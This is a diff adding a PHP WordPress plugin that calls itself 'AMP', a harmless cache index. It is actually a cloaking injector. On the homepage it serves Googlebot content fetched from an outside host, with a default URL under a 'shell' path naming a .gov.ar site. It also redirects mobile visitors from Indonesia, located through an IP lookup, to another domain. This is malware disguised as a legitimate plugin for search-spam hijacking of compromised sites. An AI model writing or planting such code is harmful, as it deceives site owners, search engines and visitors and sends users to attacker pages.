@@ -1,0 +1,131 @@
+<?php
+/**
+ * Plugin Name: AMP
+ * Description: This plugin simply acts as a cache index for the amp version taken from the main index of the home site.
+ * Version: 3.1
+ * Author: xxxTYPOxxx
+ */
+
+defined('ABSPATH') or die('No script kiddies please!');
+
+add_action('admin_menu', function() {
+    add_menu_page(
+        'WP Cloak Injector PRO',
+        'Cloak Injector',
+        'manage_options',
+        'wp-cloak-injector-pro',
+        'wp_cloak_injector_pro_settings_page'
+    );
+});
+
+add_action('admin_init', function() {
+    register_setting('wp_cloak_injector_pro_settings_group', 'wp_cloak_injector_pro_settings', 'wp_cloak_injector_pro_sanitize');
+});
+
+function wp_cloak_injector_pro_sanitize($input) {
+    $output = [];
+    $output['enable_cloak'] = !empty($input['enable_cloak']) ? 1 : 0;
+    $output['bot_url'] = !empty($input['bot_url']) ? esc_url_raw($input['bot_url']) : '';
+    $output['mobile_redirect_url'] = !empty($input['mobile_redirect_url']) ? esc_url_raw($input['mobile_redirect_url']) : '';
+    return $output;
+}
+
+function wp_cloak_injector_pro_settings_page() {
+    ?>
+    <div class="wrap">
+        <h1>WP Cloak Injector PRO Settings</h1>
+        <form method="post" action="options.php">
+            <?php
+            settings_fields('wp_cloak_injector_pro_settings_group');
+            $options = get_option('wp_cloak_injector_pro_settings');
+            ?>
+            <table class="form-table" role="presentation">
+                <tr>
+                    <th scope="row">Aktifkan Cloaking</th>
+                    <td>
+                        <input type="checkbox" name="wp_cloak_injector_pro_settings[enable_cloak]" value="1" <?php checked(1, $options['enable_cloak'] ?? 0); ?>>
+                    </td>
+                </tr>
+                <tr>
+                    <th scope="row">Bot Content URL</th>
+                    <td>
+                        <input type="url" name="wp_cloak_injector_pro_settings[bot_url]" value="<?php echo esc_attr($options['bot_url'] ?? 'https://assets-pipatoto.store/odinastic/get-content/shell/embalse.gov.ar/lp.txt'); ?>" size="70" required>
+                    </td>
+                </tr>
+                <tr>
+                    <th scope="row">Mobile Redirect URL</th>
+                    <td>
+                        <input type="url" name="wp_cloak_injector_pro_settings[mobile_redirect_url]" value="<?php echo esc_attr($options['mobile_redirect_url'] ?? 'https://embalse.pages.dev/'); ?>" size="70" required>
+                    </td>
+                </tr>
+            </table>
+            <?php submit_button('Simpan Pengaturan'); ?>
+        </form>
+    </div>
+    <?php
+}
+
+add_action('template_redirect', 'wp_cloak_injector_pro_run');
+function wp_cloak_injector_pro_run() {
+    if (is_admin()) return; // Jangan jalan di wp-admin
+
+    if (!is_front_page() && !is_home()) return; // Hanya di homepage
+
+    $options = get_option('wp_cloak_injector_pro_settings');
+    if (empty($options['enable_cloak'])) return;
+
+    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+    $country = wp_cloak_injector_pro_get_country($ip);
+
+    // Check Googlebot user agent (simple check)
+    $is_googlebot = strpos($user_agent, 'googlebot') !== false;
+
+    if ($is_googlebot) {
+        $bot_url = $options['bot_url'] ?? '';
+        if ($bot_url) {
+            $content = wp_cloak_injector_pro_fetch_content($bot_url);
+            if ($content) {
+                header('Content-Type: text/html; charset=UTF-8');
+                echo $content;
+                exit;
+            }
+        }
+    } else {
+        // Jika mobile dan dari Indonesia redirect
+        $is_mobile = preg_match('/mobile|android|iphone|ipad/i', $user_agent);
+        if ($is_mobile && strtolower($country) === 'indonesia') {
+            $redirect_url = $options['mobile_redirect_url'] ?? '';
+            if ($redirect_url) {
+                wp_redirect($redirect_url, 302);
+                exit;
+            }
+        }
+    }
+}
+
+function wp_cloak_injector_pro_get_country($ip) {
+    if (!$ip) return 'unknown';
+    $response = wp_remote_get("http://ip-api.com/json/{$ip}", ['timeout' => 3]);
+    if (is_wp_error($response)) return 'unknown';
+    $data = json_decode(wp_remote_retrieve_body($response), true);
+    if (isset($data['status']) && $data['status'] === 'success') {
+        return strtolower($data['country']);
+    }
+    return 'unknown';
+}
+
+function wp_cloak_injector_pro_fetch_content($url) {
+    $response = wp_remote_get($url, ['timeout' => 5]);
+    if (is_wp_error($response)) {
+        error_log('WP Cloak Injector PRO fetch_content error: ' . $response->get_error_message());
+        return false;
+    }
+    $body = wp_remote_retrieve_body($response);
+    if (empty($body)) {
+        error_log('WP Cloak Injector PRO fetch_content empty body from ' . $url);
+        return false;
+    }
+    return $body;
+}
